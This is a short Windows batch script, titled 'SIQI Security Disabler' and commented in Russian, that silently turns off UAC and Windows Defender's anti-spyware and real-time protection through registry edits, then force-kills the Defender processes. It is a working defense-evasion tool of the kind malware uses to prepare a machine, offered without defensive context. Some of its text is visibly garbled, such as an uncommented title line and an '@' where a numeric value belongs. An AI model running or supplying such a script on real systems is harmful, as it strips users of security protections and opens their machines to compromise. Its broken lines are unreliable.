
@echo off
::
SIQI Security Disabler
:: Отключает UAC и Windows Defender
:: === Отключить UAC (требует перезагрузки, но снижает уровень)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d @ /f >nul 2>&1
:: --- Отключить Defender (реестр)
---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
:: === убить процессы Defender'a ---
taskkill /f /im MsMpEng.exe >nul 2>&1
taskkill /f /im SecurityHealthSystray.exe >nul 2>&1
:: --- Готово ---
exit